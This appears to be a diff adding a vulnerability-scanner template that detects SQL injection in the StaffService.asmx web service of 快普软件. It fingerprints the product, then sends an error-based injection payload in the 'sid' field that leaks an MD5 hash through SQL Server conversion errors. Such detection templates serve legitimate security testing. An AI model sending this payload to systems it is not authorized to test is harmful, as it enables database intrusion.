@@ -1,0 +1,48 @@
+id: kuaipu-staffservice-sqli
+info:
+  name: 快普软件 StaffService.asmx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in 快普软件 StaffService.asmx.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Resource/JavaScript/jKPM6.DateTime.js"
+
+  - raw:
+      - |
+        POST /WebService/StaffService.asmx/GetPositionOfStaff HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sid=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
